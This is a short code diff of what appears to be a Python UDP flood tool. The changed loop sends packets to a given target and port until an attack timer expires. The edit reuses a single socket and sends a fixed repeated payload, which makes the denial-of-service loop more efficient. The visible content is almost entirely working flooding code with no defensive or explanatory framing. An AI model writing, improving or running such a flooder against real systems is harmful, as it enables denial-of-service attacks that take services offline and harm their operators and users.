@@ -15,7 +15,9 @@ def rand_items():
     return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(size))
 
 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
 while time.time() < start_time+att_time:
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.sendto(rand_items(), (target, port))
-    s.close()
+    s.sendto("xyz"*size, (target, port))
+
+s.close()
